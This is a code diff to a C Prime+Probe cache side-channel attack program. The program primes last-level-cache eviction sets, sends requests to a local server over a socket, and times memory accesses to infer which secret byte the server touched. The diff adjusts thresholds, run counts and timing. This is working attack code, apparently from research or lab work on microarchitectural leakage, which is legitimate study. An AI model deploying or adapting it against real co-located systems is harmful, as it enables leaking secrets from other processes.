@@ -20,12 +20,12 @@
 #define HUGE_PAGE_SIZE (2 * 1024 * 1024) // 2mb
 
 // prime+probe
-#define ATTACK_RUNS 1000
+#define ATTACK_RUNS 10000
 #define EVICTION_THRESHOLD 5000
 #define CACHE_STRIDE 4096
-#define PROBE_SIZE (1024 * 1024 * 1024)//(256 * 1024 * 1024)// 256mb
+#define PROBE_SIZE (256 * 1024 * 1024)//(256 * 1024 * 1024)// 256mb
 #define PAGE_COUNT (PROBE_SIZE / HUGE_PAGE_SIZE)
-#define MAX_TIME 2000
+#define MAX_TIME 20000
 // socket  volatile uint8_t tmp = *(volatile uint8_t *)curr; 
 #define PORT 8080
 #define INET "127.0.0.1"
@@ -40,6 +40,8 @@ char buf[1024]= {0};
 char attack_data[256];
 
 int main(int argc, char* argv[]) {
+    mlockall(MCL_CURRENT | MCL_FUTURE);
+
      // setup socket connection 
     struct sockaddr_in servaddr;
     open_socket(&clientfd, &servaddr);
@@ -48,7 +50,6 @@ int main(int argc, char* argv[]) {
     // allocate mem to probe_head
     probe_arr_setup();
     //printf("Probe array base address: %p\n", (void*)probe_head);
-
     // threshold for classifying cache miss
     //c_threshold = EVICTION_THRESHOLD;
 
@@ -74,65 +75,63 @@ int main(int argc, char* argv[]) {
     int max = 0;
     uint8_t spiking_byte;
 
-    //exit(1);
     for (int i = 0; i < 256; i++){ // from byte 0x00 - 0xFF
-        
-        uint8_t target_byte = (uint8_t)i;
+        int total_diff  = 0;
+
+        uint8_t target_byte = (uint8_t)i;//strtoul(argv[2], NULL, 0);
         printf("\n===== EVICTION COUNT FOR BYTE %x =====\n", target_byte);
-        node_t *probe_arr = build_linked_list(target_byte);
-        if (probe_arr == NULL){
-            continue;
-        }
 
-        int baseline_count = 0;
-        int attack_count = 0;
-        for (int j = 0; j < ATTACK_RUNS; j++) {
-            //PRIME
-            prime_cache(probe_arr);
-            _mm_lfence();
-            // BASELINE
-            send(clientfd, baseline_data, strlen(baseline_data), 0);
-
-            int n = -1;
-            while (n < 0) {
-                n = recv(clientfd, buf, sizeof(buf), 0); // deetct response started
+        for (int r = 0; r < 10; r++){
+            node_t *probe_arr = build_linked_list(target_byte);
+            if (probe_arr == NULL){
+                continue;
             }
-            _mm_mfence();
 
-            //PROBE
-            check_cache_presence(probe_arr, &baseline_count);
+            int baseline_count = 0;
+            int attack_count = 0;
+            for (int j = 0; j < ATTACK_RUNS; j++) {
+                //PRIME
+                prime_cache(probe_arr);
+                _mm_lfence();
+                // BASELINE
+                send(clientfd, baseline_data, strlen(baseline_data), 0);
+                recv(clientfd, buf, sizeof(buf), 0); 
+                _mm_mfence();
 
-            while (recv(clientfd, buf, sizeof(buf), 0) > 0); // drain socket
-            _mm_lfence();
+                //PROBE
+                check_cache_presence(probe_arr, &baseline_count);
+                _mm_lfence();
 
-            //usleep(1);
-            // = ATTACK =
-            //PRIME
-            prime_cache(probe_arr);
-            _mm_lfence();
-            // ATTACK
-            send(clientfd, attack_data, strlen(attack_data), 0);
+                // = ATTACK =
+                //PRIME
+                prime_cache(probe_arr);
+                _mm_lfence();
+
+                // ATTACK
+                send(clientfd, attack_data, strlen(attack_data), 0);
+                recv(clientfd, buf, sizeof(buf), 0);
+
+                //PROBE
+                check_cache_presence(probe_arr, &attack_count);
+                _mm_lfence();
+            } 
             
-            n = -1;
-            while (n < 0) {
-                n = recv(clientfd, buf, sizeof(buf), 0); // detect response started
+            int diff = attack_count - baseline_count;
+            if(diff > 0){
+                total_diff += diff;
             }
-            _mm_mfence();
+            
 
-            //PROBE
-            check_cache_presence(probe_arr, &attack_count);
-
-            while (recv(clientfd, buf, sizeof(buf), 0) > 0); // drain socket
-        } 
-        int diff = attack_count - baseline_count;
-        if (diff > max){
-            max = diff;
+            if(diff > 0){
+                printf("ATTACK RUN %d\n- DIFF: %d\n- ATTACK: %d misses\n- BASELINE: %d misses\n",r ,diff, attack_count, baseline_count);
+                printf("threshold used: %ld\n", c_threshold);
+            }
+        }
+        if (total_diff > max){
+            max = total_diff;
             spiking_byte = target_byte;
         }
-        if(1/*diff != 0*/){
-            printf("\n- DIFF: %d misses\n- ATTACK: %d/1000 misses\n- BASELINE: %d/1000 misses\n", diff, attack_count, baseline_count);
-            printf("threshold used: %ld\n", c_threshold);
-        }
+        usleep(0);
     }   
     printf("\nLargest Spike Byte: %x (%d)\n", spiking_byte, max);
 
@@ -159,95 +158,40 @@ node_t* build_linked_list(uint8_t target_byte){
 
     node_t *byte_addresses[PAGE_COUNT] = {(node_t *)NULL};
 
-    
-    int max_evictors = 20; // no of addresses in eviction set
 
-
-    int interestingCount = 0;
     // loop for each page and get addresses for that byte#
     for (int p = 0; p < PAGE_COUNT; p++) {
         node_t *addr = (node_t *)(probe_head + (p * HUGE_PAGE_SIZE) + byte_offset);
-        if(isAddressInteresting(addr)){
-            byte_addresses[interestingCount] = addr;
-            interestingCount ++;
-        }
-    }
-
-    if(interestingCount < max_evictors){ // if no addresses evicted at all then this byte isnt worth looking at
-        printf("For byte %x not enough interesting addresses detected (found: %d)\n", target_byte, interestingCount);
-        return NULL;
-    }
-    if(interestingCount > 0){
-        printf("NUMBER OF INTERESTING ADDRESSES FOUND: %d/%d\n", interestingCount, PAGE_COUNT);
+        byte_addresses[p] = addr;
     }
 
     // shuffle to trick prefetcher
-    for(int i = 0; i < interestingCount; i++){
+    for(int i = 0; i < PAGE_COUNT; i++){
         node_t *tmp = byte_addresses[i];
-        int shuffle_index = rand() % interestingCount;
+        int shuffle_index = rand() % PAGE_COUNT;
         // swap
         byte_addresses[i] = byte_addresses[shuffle_index];
         byte_addresses[shuffle_index] = tmp;
     }
 
     // link the pointer chain 
-    for (int i = 0; i < interestingCount-1; i++){
+    for (int i = 0; i < PAGE_COUNT-1; i++){
         byte_addresses[i]->next = byte_addresses[i+1];
     }
-    byte_addresses[interestingCount-1]->next = NULL;
+    byte_addresses[PAGE_COUNT-1]->next = NULL;
 
-    uint64_t avg_hit = avg_hit_time(byte_addresses[0]);
+    //uint64_t smart_thresh = avg_hit_time(byte_addresses[0]);
 
-    c_threshold = avg_hit + 100;
-    printf("THRESHOLD: %ld\n", c_threshold);
+    c_threshold = 260;
+    //printf("THRESHOLD: %ld\n", c_threshold);
     // return start of pointer chain
     return byte_addresses[0];
 }
 
-int isAddressInteresting(node_t *addr){
-    addr->next= NULL;
-    for (int t = 0; t < 100; t++){
-        usleep(1);
-
-        // PRIME
-        volatile uint8_t tmp = *(volatile uint8_t *)addr;
-        _mm_lfence();
-        
-        // ATTACK
-        send(clientfd, attack_data, strlen(attack_data), 0);    
-        while(recv(clientfd, buf, sizeof(buf), 0) < 0);
-
-        //PROBE
-        uint64_t t1,t2;
-        unsigned int pid;
-
-        _mm_mfence();
-        t1 = __rdtscp(&pid); 
-        _mm_lfence();
-
-        volatile uint8_t dummy = *(volatile uint8_t *)addr;
-
-        _mm_lfence();
-        t2 = __rdtscp(&pid);
-        _mm_lfence();
-
-        while(recv(clientfd, buf, sizeof(buf), 0) > 0);
-        
-        if(t2-t1 > 160){
-            //printf("\n===========INTERESTING===========\n");
-            //printf("Diff for address %p: %ld\n\n", (void *)addr, (t2-t1));
-            return 1;
-        }
-        _mm_lfence();
-    }
-
-    return 0;
-}
-
 // Prime LLC
 void prime_cache(node_t *base_ptr){
-    // loops through pointer array for a byte 2 times
-    for(int i = 0; i < 2; i++){
+    // loops through pointer array for a byte 8 times
+    for(int i = 0; i < 8; i++){
         node_t *current = base_ptr;
         while (current != NULL){
             volatile uint8_t tmp = *(volatile uint8_t *)current;
@@ -258,38 +202,33 @@ void prime_cache(node_t *base_ptr){
 }
 
 void check_cache_presence(node_t *base_ptr, int *result){
-    uint64_t t1, t2;
     unsigned int pid;
-
     node_t *current = base_ptr;
+    int evictions = 0;
+    
     _mm_mfence();
-    t1 = __rdtscp(&pid); 
-    _mm_lfence();
-
-    // loop through all set pointer addresses
+    
     while (current != NULL){
+        uint64_t t1 = __rdtscp(&pid);
+        _mm_lfence();
         volatile uint8_t tmp = *(volatile uint8_t *)current;
-        current = current->next;
-    }
-
-    _mm_lfence();
-    t2 = __rdtscp(&pid);
-    _mm_lfence();
-
-    //printf("THRESHOLD: %ld\n", c_threshold);
-
-    if (t2 - t1 > c_threshold){ // if miss detected
-
-        if (t2 - t1 <= MAX_TIME){ // limits huge values like 70000 from a kernel interrpt from effecting measurement
-            (*result)++;
+        _mm_lfence();
+        uint64_t t2 = __rdtscp(&pid);
+        
+        if ((t2 - t1) > c_threshold){
+            evictions++;
         }
+        current = current->next;
+        _mm_lfence();
     }
+    
+    (*result) += evictions;
 }
 
 
 void get_inputs(char attack_data[], int argc, char* argv[]){
     char *attack_id;
-    if (argc == 2){
+    if (argc >= 2){
         attack_id = argv[1]; 
     }else{
         printf("No Attack ID Entered\n");
@@ -311,8 +250,8 @@ void open_socket(int *clientfd, struct sockaddr_in *servaddr){
     
     *clientfd = socket(AF_INET, SOCK_STREAM, 0);
 
-    int flags = fcntl(*clientfd, F_GETFL, 0);
-    fcntl(*clientfd, F_SETFL, flags | O_NONBLOCK);
+    //int flags = fcntl(*clientfd, F_GETFL, 0);
+    //fcntl(*clientfd, F_SETFL, flags | O_NONBLOCK);
 
     servaddr->sin_family = AF_INET;
     servaddr->sin_port = htons(PORT);
@@ -330,7 +269,9 @@ void shuffle(int shuffle_arr[]){
 }
 
 uint64_t avg_hit_time(node_t *head){
-    uint64_t total_cycles = 0;
+    uint64_t hit_cycles = 0;
+    uint64_t miss_cycles = 0;
+    uint64_t runs = 0;
     char cal_buf[1024];
     
     char *baseline_data = 
@@ -345,25 +286,39 @@ uint64_t avg_hit_time(node_t *head){
         prime_cache(head); // Ensure it's in cache
 
         send(clientfd, baseline_data, strlen(baseline_data), 0);
-        while(recv(clientfd, cal_buf, sizeof(cal_buf), 0) < 0);
+        recv(clientfd, cal_buf, sizeof(cal_buf), 0);
         
-        uint64_t t1, t2;
-        unsigned int junk;
-        _mm_lfence();
-        t1 = __rdtscp(&junk);
-        
-        node_t *curr = head;
-        while(curr) {
-            volatile uint8_t tmp = *(volatile uint8_t *)curr; 
-            curr = curr->next;
+
+        unsigned int pid;
+        node_t *current = head;
+
+        while (current != NULL){
+            // hit time
+            uint64_t t1 = __rdtscp(&pid);
+            _mm_lfence();
+            volatile uint8_t tmp = *(volatile uint8_t *)current;
+            _mm_lfence();
+            uint64_t t2 = __rdtscp(&pid);
+            hit_cycles += (t2 - t1);
+
+            // miss time
+            _mm_clflush(current);
+            _mm_mfence();
+            t1 = __rdtscp(&pid);
+            _mm_lfence();
+            volatile uint8_t tmp1 = *(volatile uint8_t *)current;
+            _mm_lfence();
+            t2 = __rdtscp(&pid);
+            miss_cycles += (t2 - t1);
+
+            runs +=1;
+            current = current->next;
         }
         
-        _mm_lfence();
-        t2 = __rdtscp(&junk);
-        total_cycles += (t2 - t1);
-        while(recv(clientfd, cal_buf, sizeof(cal_buf), 0) > 0); // Drain
     }
     
-    uint64_t avg_hit_time = total_cycles / 100;
-    return avg_hit_time;
+    uint64_t avg_hit_time = hit_cycles / runs;
+    uint64_t avg_miss_time = miss_cycles / runs;
+    //printf("MISS: %ld cycles\nHIT: %ld cycles\n", avg_miss_time, avg_hit_time);
+    return (avg_hit_time + avg_miss_time) / 2;
 }
